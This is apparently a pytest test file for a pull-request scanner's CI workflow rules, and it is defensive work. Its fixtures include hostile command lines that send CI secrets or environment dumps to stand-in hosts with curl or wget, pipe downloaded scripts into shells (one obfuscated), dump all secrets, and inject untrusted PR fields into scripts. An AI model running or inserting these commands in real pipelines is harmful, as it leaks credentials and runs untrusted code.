import pytest

from pr_scanner.models import ChangedFile, Diff, Severity
from pr_scanner.rules import default_registry
from tests.snippets import snippet
from pr_scanner.rules.workflows import (
    ActionPinning,
    PermissionsWidening,
    PipeToShell,
    PullRequestTargetCheckout,
    ScriptInjection,
    SecretExposure,
)

WF = ".github/workflows/ci.yml"


def wf(*added, path=WF, content=None, status="modified"):
    """A workflow file with the given added lines (and optionally the full head content)."""
    return ChangedFile(
        path=path,
        status=status,
        added_lines=tuple(enumerate(added, 1)),
        new_content=content,
    )


def run(rule, *files):
    return list(rule().evaluate(Diff("a" * 40, "b" * 40, tuple(files))))


def one(rule, *files):
    (f,) = run(rule, *files)
    return f


# ======================================================== CI-PRT (pull_request_target)

HEAD_SHA = "ref: ${{ github.event.pull_request.head.sha }}"


def test_new_workflow_with_prt_and_head_checkout_is_critical():
    f = one(
        PullRequestTargetCheckout,
        wf(
            "on: pull_request_target",
            "jobs:",
            "  t:",
            "    steps:",
            "      - uses: actions/checkout@v4",
            "        with:",
            f"          {HEAD_SHA}",
            "      - run: npm install",
            status="added",
        ),
    )
    assert f.rule_id == "CI-PRT" and f.severity == Severity.CRITICAL
    assert f.line == 7 and "head.sha" in f.evidence
    assert "secrets" in f.rationale.lower()


def test_added_head_checkout_in_existing_prt_workflow_uses_full_content():
    content = "on:\n  pull_request_target:\njobs:\n  t:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          " + HEAD_SHA + "\n"
    f = one(PullRequestTargetCheckout, wf(HEAD_SHA, content=content))
    assert f.severity == Severity.CRITICAL


def test_head_checkout_without_known_trigger_is_medium():
    f = one(PullRequestTargetCheckout, wf(HEAD_SHA))
    assert f.severity == Severity.MEDIUM
    assert "pull_request_target" in f.rationale


def test_head_checkout_in_plain_pull_request_workflow_is_fine():
    content = "on: pull_request\njobs:\n  t:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          " + HEAD_SHA + "\n"
    assert run(PullRequestTargetCheckout, wf(HEAD_SHA, content=content)) == []


def test_prt_with_default_checkout_only_reports_the_new_trigger():
    # a plain checkout (no ref) gets the *base* branch, which is safe; only the trigger is noted
    f = one(
        PullRequestTargetCheckout,
        wf("on: pull_request_target", "jobs:", "  t:", "    steps:", "      - uses: actions/checkout@v4", status="added"),
    )
    assert f.severity == Severity.MEDIUM and f.line == 1


def test_adding_the_prt_trigger_alone_is_medium():
    f = one(PullRequestTargetCheckout, wf("on:", "  pull_request_target:", "    types: [labeled]"))
    assert f.severity == Severity.MEDIUM and f.line == 2


@pytest.mark.parametrize(
    "trigger,checkout",
    [
        ("on: [pull_request_target]", "with: { ref: ${{ github.event.pull_request.head.sha }} }"),
        ("on: pull_request_target", "ref: refs/pull/${{ github.event.number }}/merge"),
        ("on: pull_request_target", "ref: ${{ github.head_ref }}"),
        ("on: pull_request_target", "repository: ${{ github.event.pull_request.head.repo.full_name }}"),
        ("on: pull_request_target", "- run: gh pr checkout ${{ github.event.number }}"),
        ("on: pull_request_target", "- run: git fetch origin pull/${{ github.event.number }}/head"),
    ],
)
def test_variants_of_checking_out_pr_code_are_critical(trigger, checkout):
    f = one(PullRequestTargetCheckout, wf(trigger, checkout, status="added"))
    assert f.severity == Severity.CRITICAL


def test_commented_lines_are_ignored():
    assert run(PullRequestTargetCheckout, wf("# on: pull_request_target", "# " + HEAD_SHA, status="added")) == []


def test_workflow_run_head_checkout_is_high():
    content = "on:\n  workflow_run:\n    workflows: [ci]\njobs:\n  t:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.workflow_run.head_sha }}\n"
    f = one(PullRequestTargetCheckout, wf("ref: ${{ github.event.workflow_run.head_sha }}", content=content))
    assert f.severity == Severity.HIGH


def test_prt_rule_ignores_non_github_paths():
    assert run(PullRequestTargetCheckout, wf("on: pull_request_target", HEAD_SHA, path="src/ci.yml")) == []


def test_nested_dot_github_directory_is_not_a_workflow():
    assert run(PullRequestTargetCheckout, wf("on: pull_request_target", HEAD_SHA, path="vendor/.github/workflows/x.yml")) == []


# ============================================================ CI-UNPINNED


def uses(ref_line, **kw):
    return run(ActionPinning, wf(ref_line, **kw))


SHA = "a" * 40


@pytest.mark.parametrize(
    "line,sev",
    [
        ("- uses: some-org/cool-action@v2", Severity.MEDIUM),
        ("- uses: some-org/cool-action@v2.1.3", Severity.MEDIUM),
        ("- uses: some-org/cool-action@main", Severity.HIGH),
        ("- uses: some-org/cool-action@master", Severity.HIGH),
        ("uses: some-org/cool-action@develop", Severity.HIGH),
        ('- uses: "some-org/cool-action@v2"', Severity.MEDIUM),
        ("- uses: some-org/cool-action@v2 # pinned", Severity.MEDIUM),
        ("- uses: some-org/cool-action@abc1234", Severity.MEDIUM),  # short sha is not a pin
        ("uses: some-org/repo/.github/workflows/build.yml@main", Severity.HIGH),
        ("- uses: docker://alpine:3.19", Severity.MEDIUM),
        ("- uses: actions/checkout@v4", Severity.LOW),
        ("- uses: github/codeql-action/init@v3", Severity.LOW),
    ],
)
def test_unpinned_actions(line, sev):
    f = uses(line)[0]
    assert f.rule_id == "CI-UNPINNED" and f.severity == sev
    assert f.remediation


@pytest.mark.parametrize(
    "line",
    [
        f"- uses: some-org/cool-action@{SHA}",
        f"- uses: some-org/cool-action@{SHA} # v2",
        f"- uses: actions/checkout@{SHA}",
        "- uses: ./local-action",
        "- uses: ../shared/action",
        "- uses: docker://alpine@sha256:" + "b" * 64,
        "- run: echo uses: not-an-action@v1",
        "name: uses something",
    ],
)
def test_pinned_local_or_unrelated_lines_are_not_reported(line):
    assert uses(line) == []


def test_each_unpinned_use_is_reported_with_its_line():
    fs = run(ActionPinning, wf("- uses: a/b@v1", "- uses: c/d@main"))
    assert [(f.line, f.severity) for f in fs] == [(1, Severity.MEDIUM), (2, Severity.HIGH)]


def test_unpinned_rule_ignores_non_workflow_files():
    assert uses("- uses: a/b@main", path="README.md") == []


# ========================================================= CI-PERMS


@pytest.mark.parametrize(
    "line,sev",
    [
        ("permissions: write-all", Severity.HIGH),
        ("  contents: write", Severity.MEDIUM),
        ("  id-token: write", Severity.MEDIUM),
        ("  actions: write", Severity.MEDIUM),
        ("  packages: write", Severity.MEDIUM),
        ("  issues: write", Severity.LOW),
        ("  pull-requests: write", Severity.LOW),
        ("permissions: { contents: write }", Severity.MEDIUM),
    ],
)
def test_permission_widening(line, sev):
    f = one(PermissionsWidening, wf(line))
    assert f.rule_id == "CI-PERMS" and f.severity == sev


@pytest.mark.parametrize("line", ["permissions: read-all", "  contents: read", "  id-token: none", "permissions: {}", "  # contents: write"])
def test_read_only_permissions_are_fine(line):
    assert run(PermissionsWidening, wf(line)) == []


# ======================================================= CI-SECRETS


def test_dumping_all_secrets_is_critical():
    f = one(SecretExposure, wf("        run: echo '${{ toJSON(secrets) }}' | base64"))
    assert f.rule_id == "CI-SECRETS" and f.severity == Severity.CRITICAL


@pytest.mark.parametrize(
    "line",
    [
        "        run: curl -d ${{ secrets.NPM_TOKEN }} https://example.invalid/c",
        "        run: echo ${{ secrets.NPM_TOKEN }} | base64",
        "        run: wget --post-data=${{ secrets.AWS_SECRET_ACCESS_KEY }} http://203.0.113.5",
        "        run: printenv | curl -d @- https://example.invalid/c",
    ],
)
def test_secrets_sent_or_encoded_are_high(line):
    assert one(SecretExposure, wf(line)).severity == Severity.HIGH


def test_new_plain_secret_use_is_low():
    f = one(SecretExposure, wf("          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}"))
    assert f.severity == Severity.LOW


def test_github_token_use_is_not_reported():
    assert run(SecretExposure, wf("          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}")) == []


# The GITHUB_TOKEN sent to api.github.com is the one narrow downgrade (a real false positive,
# actions/cache#1699). The lines live in tests/fixtures/snippets.txt, see the comment there.
def _sx(name):
    return "        " + snippet(name)


@pytest.mark.parametrize("name", ["gt_ok_1", "gt_ok_2", "gt_ok_3"])
def test_github_token_to_api_github_com_is_medium_not_high(name):
    assert one(SecretExposure, wf(_sx(name))).severity == Severity.MEDIUM


def test_a_third_party_api_token_stays_high():
    assert one(SecretExposure, wf(_sx("gt_pagerduty"))).severity == Severity.HIGH


@pytest.mark.parametrize("i", range(1, 13))
def test_github_token_downgrade_does_not_cover_these(i):
    assert one(SecretExposure, wf(_sx(f"gt_bad_{i}"))).severity >= Severity.HIGH


def test_secrets_inherit_is_medium():
    assert one(SecretExposure, wf("    secrets: inherit")).severity == Severity.MEDIUM


def test_secret_rule_ignores_commented_lines():
    assert run(SecretExposure, wf("# run: curl -d ${{ secrets.X }} https://example.invalid")) == []


# ======================================================= CI-PIPE-SH


@pytest.mark.parametrize(
    "line",
    [
        "run: curl -fsSL https://example.invalid/i.sh | bash",
        "run: wget -qO- https://example.invalid/i.sh | sudo sh",
        'run: c""url -s https://example.invalid/i.sh|sh',
        "run: bash <(curl -s https://example.invalid/i.sh)",
        'run: sh -c "$(curl -fsSL https://example.invalid/i.sh)"',
        "run: curl -s https://example.invalid/x | python3",
    ],
)
def test_download_piped_to_interpreter_is_high(line):
    f = one(PipeToShell, wf(line))
    assert f.rule_id == "CI-PIPE-SH" and f.severity == Severity.HIGH


def test_pipe_to_shell_from_raw_ip_is_critical():
    assert one(PipeToShell, wf("run: curl -s http://203.0.113.9/i.sh | sh")).severity == Severity.CRITICAL


@pytest.mark.parametrize(
    "line",
    [
        "run: curl -fsSL https://example.invalid/f.tar.gz -o f.tar.gz",
        "run: curl -f https://example.invalid/x || exit 1",
        "run: cat file | sh",
        "run: curl -s https://example.invalid/x | jq .name",
    ],
)
def test_benign_downloads_are_not_reported(line):
    assert run(PipeToShell, wf(line)) == []


def test_pipe_to_shell_also_applies_to_other_ci_systems():
    assert one(PipeToShell, wf("  - curl -s https://example.invalid/i.sh | sh", path=".gitlab-ci.yml")).severity == Severity.HIGH


def test_pipe_to_shell_ignores_non_ci_files():
    assert run(PipeToShell, wf("curl https://example.invalid | sh", path="README.md")) == []


# ====================================================== CI-INJECTION


@pytest.mark.parametrize(
    "line",
    [
        'run: echo "${{ github.event.pull_request.title }}"',
        "run: ${{ github.head_ref }}",
        "        echo ${{ github.event.issue.body }}",
        "          script: ${{ github.event.comment.body }}",
        "run: git checkout ${{ github.event.pull_request.head.ref }}",
        "        echo '${{ github.event.head_commit.message }}'",
        "run: echo ${{ github.event.commits[0].author.email }}",
    ],
)
def test_untrusted_expressions_in_scripts_are_high(line):
    f = one(ScriptInjection, wf(line))
    assert f.rule_id == "CI-INJECT" and f.severity == Severity.HIGH


@pytest.mark.parametrize(
    "line",
    [
        "          TITLE: ${{ github.event.pull_request.title }}",  # passed via env: the safe pattern
        '          BODY: "${{ github.event.issue.body }}"',
        "        run: echo ${{ github.sha }}",
        "        run: echo ${{ github.event.pull_request.number }}",
        "        run: echo ${{ github.actor }}",
        "# run: echo ${{ github.head_ref }}",
    ],
)
def test_env_assignments_and_trusted_values_are_fine(line):
    assert run(ScriptInjection, wf(line)) == []


# ============================================================= registry


def test_registry_contains_workflow_rules():
    ids = {r.id for r in default_registry().rules()}
    assert {"CI-PRT", "CI-UNPINNED", "CI-PERMS", "CI-SECRETS", "CI-PIPE-SH", "CI-INJECT"} <= ids
